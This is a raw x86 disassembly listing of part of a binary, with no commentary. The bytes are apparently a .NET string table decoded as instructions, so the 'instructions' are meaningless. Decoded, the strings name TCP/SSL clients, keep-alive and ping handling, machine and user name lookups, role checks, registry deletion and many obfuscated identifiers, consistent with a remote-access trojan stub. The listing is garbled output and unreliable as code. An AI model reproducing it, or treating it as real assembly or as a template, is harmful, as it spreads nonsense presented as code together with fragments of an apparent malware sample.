  407efc:	00 4b 6c             	add    %cl,0x6c(%ebx)
  407eff:	46                   	inc    %esi
  407f00:	4b                   	dec    %ebx
  407f01:	65 59                	gs pop %ecx
  407f03:	77 49                	ja     0x407f4e
  407f05:	50                   	push   %eax
  407f06:	5a                   	pop    %edx
  407f07:	00 65 55             	add    %ah,0x55(%ebp)
  407f0a:	47                   	inc    %edi
  407f0b:	52                   	push   %edx
  407f0c:	4a                   	dec    %edx
  407f0d:	53                   	push   %ebx
  407f0e:	55                   	push   %ebp
  407f0f:	6f                   	outsl  %ds:(%esi),(%dx)
  407f10:	46                   	inc    %esi
  407f11:	49                   	dec    %ecx
  407f12:	4f                   	dec    %edi
  407f13:	70 53                	jo     0x407f68
  407f15:	5a                   	pop    %edx
  407f16:	00 52 70             	add    %dl,0x70(%edx)
  407f19:	48                   	dec    %eax
  407f1a:	6b 53 4c 77          	imul   $0x77,0x4c(%ebx),%edx
  407f1e:	64 66 79 5a          	fs data16 jns 0x407f7c
  407f22:	00 76 61             	add    %dh,0x61(%esi)
  407f25:	6c                   	insb   (%dx),%es:(%edi)
  407f26:	75 65                	jne    0x407f8d
  407f28:	5f                   	pop    %edi
  407f29:	5f                   	pop    %edi
  407f2a:	00 77 76             	add    %dh,0x76(%edi)
  407f2d:	56                   	push   %esi
  407f2e:	6c                   	insb   (%dx),%es:(%edi)
  407f2f:	65 47                	gs inc %edi
  407f31:	73 5a                	jae    0x407f8d
  407f33:	7a 44                	jp     0x407f79
  407f35:	61                   	popa
  407f36:	4f                   	dec    %edi
  407f37:	61                   	popa
  407f38:	00 74 74 46          	add    %dh,0x46(%esp,%esi,2)
  407f3c:	52                   	push   %edx
  407f3d:	73 6c                	jae    0x407fab
  407f3f:	69 6b 58 4f 51 61 00 	imul   $0x61514f,0x58(%ebx),%ebp
  407f46:	6b 51 58 72          	imul   $0x72,0x58(%ecx),%edx
  407f4a:	61                   	popa
  407f4b:	41                   	inc    %ecx
  407f4c:	4b                   	dec    %ebx
  407f4d:	4b                   	dec    %ebx
  407f4e:	41                   	inc    %ecx
  407f4f:	79 73                	jns    0x407fc4
  407f51:	44                   	inc    %esp
  407f52:	67 61                	addr16 popa
  407f54:	61                   	popa
  407f55:	00 42 7a             	add    %al,0x7a(%edx)
  407f58:	52                   	push   %edx
  407f59:	66 4c                	dec    %sp
  407f5b:	6a 41                	push   $0x41
  407f5d:	67 78 71             	addr16 js 0x407fd1
  407f60:	64 64 6d             	fs fs insl (%dx),%es:(%edi)
  407f63:	75 61                	jne    0x407fc6
  407f65:	00 66 69             	add    %ah,0x69(%esi)
  407f68:	53                   	push   %ebx
  407f69:	4c                   	dec    %esp
  407f6a:	70 69                	jo     0x407fd5
  407f6c:	4e                   	dec    %esi
  407f6d:	6e                   	outsb  %ds:(%esi),(%dx)
  407f6e:	51                   	push   %ecx
  407f6f:	62 00                	bound  %eax,(%eax)
  407f71:	63 67 73             	arpl   %esp,0x73(%edi)
  407f74:	6f                   	outsl  %ds:(%esi),(%dx)
  407f75:	4a                   	dec    %edx
  407f76:	45                   	inc    %ebp
  407f77:	6f                   	outsl  %ds:(%esi),(%dx)
  407f78:	79 69                	jns    0x407fe3
  407f7a:	69 62 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%edx),%esp
  407f81:	72 6c                	jb     0x407fef
  407f83:	69 62 00 53 74 75 62 	imul   $0x62757453,0x0(%edx),%esp
  407f8a:	00 7a 5a             	add    %bh,0x5a(%edx)
  407f8d:	70 6b                	jo     0x407ffa
  407f8f:	6d                   	insl   (%dx),%es:(%edi)
  407f90:	6b 55 6e 43          	imul   $0x43,0x6e(%ebp),%edx
  407f94:	4a                   	dec    %edx
  407f95:	6e                   	outsb  %ds:(%esi),(%dx)
  407f96:	66 46                	inc    %si
  407f98:	63 00                	arpl   %eax,(%eax)
  407f9a:	6b 77 55 77          	imul   $0x77,0x55(%edi),%esi
  407f9e:	4f                   	dec    %edi
  407f9f:	64 45                	fs inc %ebp
  407fa1:	45                   	inc    %ebp
  407fa2:	6d                   	insl   (%dx),%es:(%edi)
  407fa3:	69 74 4c 63 00 61 76 	imul   $0x44766100,0x63(%esp,%ecx,2),%esi
  407faa:	44 
  407fab:	66 6f                	outsw  %ds:(%esi),(%dx)
  407fad:	4c                   	dec    %esp
  407fae:	6a 70                	push   $0x70
  407fb0:	58                   	pop    %eax
  407fb1:	4d                   	dec    %ebp
  407fb2:	63 00                	arpl   %eax,(%eax)
  407fb4:	53                   	push   %ebx
  407fb5:	79 73                	jns    0x40802a
  407fb7:	74 65                	je     0x40801e
  407fb9:	6d                   	insl   (%dx),%es:(%edi)
  407fba:	2e 43                	cs inc %ebx
  407fbc:	6f                   	outsl  %ds:(%esi),(%dx)
  407fbd:	6c                   	insb   (%dx),%es:(%edi)
  407fbe:	6c                   	insb   (%dx),%es:(%edi)
  407fbf:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407fc4:	6e                   	outsb  %ds:(%esi),(%dx)
  407fc5:	73 2e                	jae    0x407ff5
  407fc7:	47                   	inc    %edi
  407fc8:	65 6e                	outsb  %gs:(%esi),(%dx)
  407fca:	65 72 69             	gs jb  0x408036
  407fcd:	63 00                	arpl   %eax,(%eax)
  407fcf:	4d                   	dec    %ebp
  407fd0:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407fd7:	74 2e                	je     0x408007
  407fd9:	56                   	push   %esi
  407fda:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407fe1:	73 69                	jae    0x40804c
  407fe3:	63 00                	arpl   %eax,(%eax)
  407fe5:	67 65 74 5f          	addr16 gs je 0x408048
  407fe9:	53                   	push   %ebx
  407fea:	65 6e                	outsb  %gs:(%esi),(%dx)
  407fec:	64 53                	fs push %ebx
  407fee:	79 6e                	jns    0x40805e
  407ff0:	63 00                	arpl   %eax,(%eax)
  407ff2:	72 6e                	jb     0x408062
  407ff4:	50                   	push   %eax
  407ff5:	76 73                	jbe    0x40806a
  407ff7:	6a 46                	push   $0x46
  407ff9:	72 4f                	jb     0x40804a
  407ffb:	52                   	push   %edx
  407ffc:	4b                   	dec    %ebx
  407ffd:	7a 63                	jp     0x408062
  407fff:	00 67 65             	add    %ah,0x65(%edi)
  408002:	74 5f                	je     0x408063
  408004:	49                   	dec    %ecx
  408005:	64 00 72 57          	add    %dh,%fs:0x57(%edx)
  408009:	6e                   	outsb  %ds:(%esi),(%dx)
  40800a:	76 45                	jbe    0x408051
  40800c:	75 57                	jne    0x408065
  40800e:	62 78 70             	bound  %edi,0x70(%eax)
  408011:	4f                   	dec    %edi
  408012:	78 4d                	js     0x408061
  408014:	6c                   	insb   (%dx),%es:(%edi)
  408015:	49                   	dec    %ecx
  408016:	64 00 44 57 6d       	add    %al,%fs:0x6d(%edi,%edx,2)
  40801b:	44                   	inc    %esp
  40801c:	6e                   	outsb  %ds:(%esi),(%dx)
  40801d:	73 77                	jae    0x408096
  40801f:	6d                   	insl   (%dx),%es:(%edi)
  408020:	42                   	inc    %edx
  408021:	4a                   	dec    %edx
  408022:	64 00 55 52          	add    %dl,%fs:0x52(%ebp)
  408026:	73 52                	jae    0x40807a
  408028:	4e                   	dec    %esi
  408029:	59                   	pop    %ecx
  40802a:	6e                   	outsb  %ds:(%esi),(%dx)
  40802b:	49                   	dec    %ecx
  40802c:	4b                   	dec    %ebx
  40802d:	64 00 59 4f          	add    %bl,%fs:0x4f(%ecx)
  408031:	43                   	inc    %ebx
  408032:	75 59                	jne    0x40808d
  408034:	53                   	push   %ebx
  408035:	66 6b 53 59 56       	imul   $0x56,0x59(%ebx),%dx
  40803a:	59                   	pop    %ecx
  40803b:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  40803f:	64 52                	fs push %edx
  408041:	65 61                	gs popa
  408043:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  408047:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  40804e:	00 
  40804f:	54                   	push   %esp
  408050:	68 72 65 61 64       	push   $0x64616572
  408055:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  408059:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  40805d:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  408061:	41                   	inc    %ecx
  408062:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  408068:	61                   	popa
  408069:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  40806f:	74 5f                	je     0x4080d0
  408071:	43                   	inc    %ebx
  408072:	6f                   	outsl  %ds:(%esi),(%dx)
  408073:	6e                   	outsb  %ds:(%esi),(%dx)
  408074:	6e                   	outsb  %ds:(%esi),(%dx)
  408075:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40807a:	00 67 65             	add    %ah,0x65(%edi)
  40807d:	74 5f                	je     0x4080de
  40807f:	49                   	dec    %ecx
  408080:	73 43                	jae    0x4080c5
  408082:	6f                   	outsl  %ds:(%esi),(%dx)
  408083:	6e                   	outsb  %ds:(%esi),(%dx)
  408084:	6e                   	outsb  %ds:(%esi),(%dx)
  408085:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40808a:	00 73 65             	add    %dh,0x65(%ebx)
  40808d:	74 5f                	je     0x4080ee
  40808f:	49                   	dec    %ecx
  408090:	73 43                	jae    0x4080d5
  408092:	6f                   	outsl  %ds:(%esi),(%dx)
  408093:	6e                   	outsb  %ds:(%esi),(%dx)
  408094:	6e                   	outsb  %ds:(%esi),(%dx)
  408095:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40809a:	00 4b 75             	add    %cl,0x75(%ebx)
  40809d:	42                   	inc    %edx
  40809e:	57                   	push   %edi
  40809f:	78 6b                	js     0x40810c
  4080a1:	43                   	inc    %ebx
  4080a2:	41                   	inc    %ecx
  4080a3:	68 4c 4e 6e 72       	push   $0x726e4e4c
  4080a8:	62 6d 67             	bound  %ebp,0x67(%ebp)
  4080ab:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  4080af:	74 5f                	je     0x408110
  4080b1:	47                   	inc    %edi
  4080b2:	75 69                	jne    0x40811d
  4080b4:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  4080b8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4080ba:	64 53                	fs push %ebx
  4080bc:	79 6e                	jns    0x40812c
  4080be:	63 3e                	arpl   %edi,(%esi)
  4080c0:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4080c4:	61                   	popa
  4080c5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4080c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4080c9:	67 46                	addr16 inc %esi
  4080cb:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4080d2:	73 43                	jae    0x408117
  4080d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4080d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4080d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4080d7:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4080dc:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4080e1:	61                   	popa
  4080e2:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4080e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4080e6:	67 46                	addr16 inc %esi
  4080e8:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  4080ef:	65 65 70 41          	gs gs jo 0x408134
  4080f3:	6c                   	insb   (%dx),%es:(%edi)
  4080f4:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  4080fb:	42                   	inc    %edx
  4080fc:	61                   	popa
  4080fd:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408100:	6e                   	outsb  %ds:(%esi),(%dx)
  408101:	67 46                	addr16 inc %esi
  408103:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  40810a:	65 61                	gs popa
  40810c:	64 65 72 53          	fs gs jb 0x408163
  408110:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  408117:	42                   	inc    %edx
  408118:	61                   	popa
  408119:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40811c:	6e                   	outsb  %ds:(%esi),(%dx)
  40811d:	67 46                	addr16 inc %esi
  40811f:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  408126:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  40812d:	42                   	inc    %edx
  40812e:	61                   	popa
  40812f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408132:	6e                   	outsb  %ds:(%esi),(%dx)
  408133:	67 46                	addr16 inc %esi
  408135:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  40813c:	6e                   	outsb  %ds:(%esi),(%dx)
  40813d:	74 65                	je     0x4081a4
  40813f:	72 76                	jb     0x4081b7
  408141:	61                   	popa
  408142:	6c                   	insb   (%dx),%es:(%edi)
  408143:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408148:	61                   	popa
  408149:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40814c:	6e                   	outsb  %ds:(%esi),(%dx)
  40814d:	67 46                	addr16 inc %esi
  40814f:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  408156:	75 66                	jne    0x4081be
  408158:	66 65 72 3e          	data16 gs jb 0x40819a
  40815c:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408160:	61                   	popa
  408161:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408164:	6e                   	outsb  %ds:(%esi),(%dx)
  408165:	67 46                	addr16 inc %esi
  408167:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  40816e:	66 66 73 65          	data16 data16 jae 0x4081d7
  408172:	74 3e                	je     0x4081b2
  408174:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408178:	61                   	popa
  408179:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40817c:	6e                   	outsb  %ds:(%esi),(%dx)
  40817d:	67 46                	addr16 inc %esi
  40817f:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  408186:	73 6c                	jae    0x4081f4
  408188:	43                   	inc    %ebx
  408189:	6c                   	insb   (%dx),%es:(%edi)
  40818a:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  408191:	5f                   	pop    %edi
  408192:	42                   	inc    %edx
  408193:	61                   	popa
  408194:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408197:	6e                   	outsb  %ds:(%esi),(%dx)
  408198:	67 46                	addr16 inc %esi
  40819a:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  4081a1:	63 70 43             	arpl   %esi,0x43(%eax)
  4081a4:	6c                   	insb   (%dx),%es:(%edi)
  4081a5:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4081ac:	5f                   	pop    %edi
  4081ad:	42                   	inc    %edx
  4081ae:	61                   	popa
  4081af:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4081b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4081b3:	67 46                	addr16 inc %esi
  4081b5:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  4081bc:	70 65                	jo     0x408223
  4081be:	6e                   	outsb  %ds:(%esi),(%dx)
  4081bf:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4081c3:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  4081ca:	61 
  4081cb:	6c                   	insb   (%dx),%es:(%edi)
  4081cc:	75 65                	jne    0x408233
  4081ce:	4b                   	dec    %ebx
  4081cf:	69 6e 64 00 54 59 4e 	imul   $0x4e595400,0x64(%esi),%ebp
  4081d6:	77 65                	ja     0x40823d
  4081d8:	64 6e                	outsb  %fs:(%esi),(%dx)
  4081da:	41                   	inc    %ecx
  4081db:	6b 49 70 64          	imul   $0x64,0x70(%ecx),%ecx
  4081df:	00 6e 56             	add    %ch,0x56(%esi)
  4081e2:	78 7a                	js     0x40825e
  4081e4:	4b                   	dec    %ebx
  4081e5:	43                   	inc    %ebx
  4081e6:	70 59                	jo     0x408241
  4081e8:	56                   	push   %esi
  4081e9:	50                   	push   %eax
  4081ea:	5a                   	pop    %edx
  4081eb:	74 48                	je     0x408235
  4081ed:	65 00 46 5a          	add    %al,%gs:0x5a(%esi)
  4081f1:	43                   	inc    %ebx
  4081f2:	69 4c 72 53 53 42 65 	imul   $0x70654253,0x53(%edx,%esi,2),%ecx
  4081f9:	70 
  4081fa:	74 6d                	je     0x408269
  4081fc:	4f                   	dec    %edi
  4081fd:	65 00 48 56          	add    %cl,%gs:0x56(%eax)
  408201:	5a                   	pop    %edx
  408202:	6b 46 71 4f          	imul   $0x4f,0x71(%esi),%eax
  408206:	53                   	push   %ebx
  408207:	4a                   	dec    %edx
  408208:	77 48                	ja     0x408252
  40820a:	54                   	push   %esp
  40820b:	65 00 56 48          	add    %dl,%gs:0x48(%esi)
  40820f:	6f                   	outsl  %ds:(%esi),(%dx)
  408210:	61                   	popa
  408211:	48                   	dec    %eax
  408212:	51                   	push   %ecx
  408213:	57                   	push   %edi
  408214:	7a 42                	jp     0x408258
  408216:	71 43                	jno    0x40825b
  408218:	58                   	pop    %eax
  408219:	65 00 55 66          	add    %dl,%gs:0x66(%ebp)
  40821d:	77 6a                	ja     0x408289
  40821f:	63 5a 6a             	arpl   %ebx,0x6a(%edx)
  408222:	7a 6e                	jp     0x408292
  408224:	58                   	pop    %eax
  408225:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408229:	70 6c                	jo     0x408297
  40822b:	61                   	popa
  40822c:	63 65 00             	arpl   %esp,0x0(%ebp)
  40822f:	43                   	inc    %ebx
  408230:	72 65                	jb     0x408297
  408232:	61                   	popa
  408233:	74 65                	je     0x40829a
  408235:	49                   	dec    %ecx
  408236:	6e                   	outsb  %ds:(%esi),(%dx)
  408237:	73 74                	jae    0x4082ad
  408239:	61                   	popa
  40823a:	6e                   	outsb  %ds:(%esi),(%dx)
  40823b:	63 65 00             	arpl   %esp,0x0(%ebp)
  40823e:	73 65                	jae    0x4082a5
  408240:	74 5f                	je     0x4082a1
  408242:	4d                   	dec    %ebp
  408243:	6f                   	outsl  %ds:(%esi),(%dx)
  408244:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  408249:	6c                   	insb   (%dx),%es:(%edi)
  40824a:	65 4d                	gs dec %ebp
  40824c:	6f                   	outsl  %ds:(%esi),(%dx)
  40824d:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  408252:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  408259:	64 65 
  40825b:	00 45 6e             	add    %al,0x6e(%ebp)
  40825e:	74 65                	je     0x4082c5
  408260:	72 44                	jb     0x4082a6
  408262:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408266:	4d                   	dec    %ebp
  408267:	6f                   	outsl  %ds:(%esi),(%dx)
  408268:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  40826d:	79 70                	jns    0x4082df
  40826f:	74 6f                	je     0x4082e0
  408271:	53                   	push   %ebx
  408272:	74 72                	je     0x4082e6
  408274:	65 61                	gs popa
  408276:	6d                   	insl   (%dx),%es:(%edi)
  408277:	4d                   	dec    %ebp
  408278:	6f                   	outsl  %ds:(%esi),(%dx)
  408279:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  40827e:	6d                   	insl   (%dx),%es:(%edi)
  40827f:	70 72                	jo     0x4082f3
  408281:	65 73 73             	gs jae 0x4082f7
  408284:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  40828b:	00 43 69             	add    %al,0x69(%ebx)
  40828e:	70 68                	jo     0x4082f8
  408290:	65 72 4d             	gs jb  0x4082e0
  408293:	6f                   	outsl  %ds:(%esi),(%dx)
  408294:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  408299:	6c                   	insb   (%dx),%es:(%edi)
  40829a:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  40829f:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  4082a5:	65 74 65             	gs je  0x40830d
  4082a8:	53                   	push   %ebx
  4082a9:	75 62                	jne    0x40830d
  4082ab:	4b                   	dec    %ebx
  4082ac:	65 79 54             	gs jns 0x408303
  4082af:	72 65                	jb     0x408316
  4082b1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4082b5:	74 5f                	je     0x408316
  4082b7:	4d                   	dec    %ebp
  4082b8:	65 73 73             	gs jae 0x40832e
  4082bb:	61                   	popa
  4082bc:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  4082c1:	76 6f                	jbe    0x408332
  4082c3:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  4082c7:	45                   	inc    %ebp
  4082c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4082c9:	75 6d                	jne    0x408338
  4082cb:	65 72 61             	gs jb  0x40832f
  4082ce:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  4082d2:	49                   	dec    %ecx
  4082d3:	44                   	inc    %esp
  4082d4:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4082db:	6c                   	insb   (%dx),%es:(%edi)
  4082dc:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  4082e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4082e2:	75 62                	jne    0x408346
  4082e4:	6c                   	insb   (%dx),%es:(%edi)
  4082e5:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4082e9:	74 5f                	je     0x40834a
  4082eb:	48                   	dec    %eax
  4082ec:	61                   	popa
  4082ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4082ee:	64 6c                	fs insb (%dx),%es:(%edi)
  4082f0:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4082f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4082f5:	74 69                	je     0x408360
  4082f7:	6d                   	insl   (%dx),%es:(%edi)
  4082f8:	65 46                	gs inc %esi
  4082fa:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  408301:	64 6c                	fs insb (%dx),%es:(%edi)
  408303:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408307:	74 4d                	je     0x408356
  408309:	6f                   	outsl  %ds:(%esi),(%dx)
  40830a:	64 75 6c             	fs jne 0x408379
  40830d:	65 48                	gs dec %eax
  40830f:	61                   	popa
  408310:	6e                   	outsb  %ds:(%esi),(%dx)
  408311:	64 6c                	fs insb (%dx),%es:(%edi)
  408313:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408317:	6e                   	outsb  %ds:(%esi),(%dx)
  408318:	74 69                	je     0x408383
  40831a:	6d                   	insl   (%dx),%es:(%edi)
  40831b:	65 54                	gs push %esp
  40831d:	79 70                	jns    0x40838f
  40831f:	65 48                	gs dec %eax
  408321:	61                   	popa
  408322:	6e                   	outsb  %ds:(%esi),(%dx)
  408323:	64 6c                	fs insb (%dx),%es:(%edi)
  408325:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408329:	74 54                	je     0x40837f
  40832b:	79 70                	jns    0x40839d
  40832d:	65 46                	gs inc %esi
  40832f:	72 6f                	jb     0x4083a0
  408331:	6d                   	insl   (%dx),%es:(%edi)
  408332:	48                   	dec    %eax
  408333:	61                   	popa
  408334:	6e                   	outsb  %ds:(%esi),(%dx)
  408335:	64 6c                	fs insb (%dx),%es:(%edi)
  408337:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  40833b:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408342:	65 
  408343:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  408347:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  40834e:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  408355:	6e 
  408356:	52                   	push   %edx
  408357:	6f                   	outsl  %ds:(%esi),(%dx)
  408358:	6c                   	insb   (%dx),%es:(%edi)
  408359:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  40835d:	6e                   	outsb  %ds:(%esi),(%dx)
  40835e:	64 6f                	outsl  %fs:(%esi),(%dx)
  408360:	77 73                	ja     0x4083d5
  408362:	42                   	inc    %edx
  408363:	75 69                	jne    0x4083ce
  408365:	6c                   	insb   (%dx),%es:(%edi)
  408366:	74 49                	je     0x4083b1
  408368:	6e                   	outsb  %ds:(%esi),(%dx)
  408369:	52                   	push   %edx
  40836a:	6f                   	outsl  %ds:(%esi),(%dx)
  40836b:	6c                   	insb   (%dx),%es:(%edi)
  40836c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408370:	74 5f                	je     0x4083d1
  408372:	4d                   	dec    %ebp
  408373:	61                   	popa
  408374:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  40837b:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40837f:	6f                   	outsl  %ds:(%esi),(%dx)
  408380:	63 65 73             	arpl   %esp,0x73(%ebp)
  408383:	73 4d                	jae    0x4083d2
  408385:	6f                   	outsl  %ds:(%esi),(%dx)
  408386:	64 75 6c             	fs jne 0x4083f5
  408389:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40838d:	74 5f                	je     0x4083ee
  40838f:	57                   	push   %edi
  408390:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408397:	79 6c                	jns    0x408405
  408399:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40839d:	6f                   	outsl  %ds:(%esi),(%dx)
  40839e:	63 65 73             	arpl   %esp,0x73(%ebp)
  4083a1:	73 57                	jae    0x4083fa
  4083a3:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4083aa:	79 6c                	jns    0x408418
  4083ac:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4083b0:	74 5f                	je     0x408411
  4083b2:	46                   	inc    %esi
  4083b3:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4083ba:	00 
  4083bb:	73 65                	jae    0x408422
  4083bd:	74 5f                	je     0x40841e
  4083bf:	46                   	inc    %esi
  4083c0:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4083c7:	00 
  4083c8:	47                   	inc    %edi
  4083c9:	65 74 54             	gs je  0x408420
  4083cc:	65 6d                	gs insl (%dx),%es:(%edi)
  4083ce:	70 46                	jo     0x408416
  4083d0:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4083d7:	00 
  4083d8:	47                   	inc    %edi
  4083d9:	65 74 46             	gs je  0x408422
  4083dc:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4083e3:	00 
  4083e4:	67 65 74 5f          	addr16 gs je 0x408447
  4083e8:	4d                   	dec    %ebp
  4083e9:	61                   	popa
  4083ea:	63 68 69             	arpl   %ebp,0x69(%eax)
  4083ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ee:	65 4e                	gs dec %esi
  4083f0:	61                   	popa
  4083f1:	6d                   	insl   (%dx),%es:(%edi)
  4083f2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4083f6:	74 5f                	je     0x408457
  4083f8:	4f                   	dec    %edi
  4083f9:	53                   	push   %ebx
  4083fa:	46                   	inc    %esi
  4083fb:	75 6c                	jne    0x408469
  4083fd:	6c                   	insb   (%dx),%es:(%edi)
  4083fe:	4e                   	dec    %esi
  4083ff:	61                   	popa
  408400:	6d                   	insl   (%dx),%es:(%edi)
  408401:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408405:	74 5f                	je     0x408466
  408407:	46                   	inc    %esi
  408408:	75 6c                	jne    0x408476
  40840a:	6c                   	insb   (%dx),%es:(%edi)
  40840b:	4e                   	dec    %esi
  40840c:	61                   	popa
  40840d:	6d                   	insl   (%dx),%es:(%edi)
  40840e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408412:	74 5f                	je     0x408473
  408414:	55                   	push   %ebp
  408415:	73 65                	jae    0x40847c
  408417:	72 4e                	jb     0x408467
  408419:	61                   	popa
  40841a:	6d                   	insl   (%dx),%es:(%edi)
  40841b:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  40841f:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  408423:	6f                   	outsl  %ds:(%esi),(%dx)
  408424:	73 74                	jae    0x40849a
  408426:	4e                   	dec    %esi
  408427:	61                   	popa
  408428:	6d                   	insl   (%dx),%es:(%edi)
  408429:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  40842e:	65 54                	gs push %esp
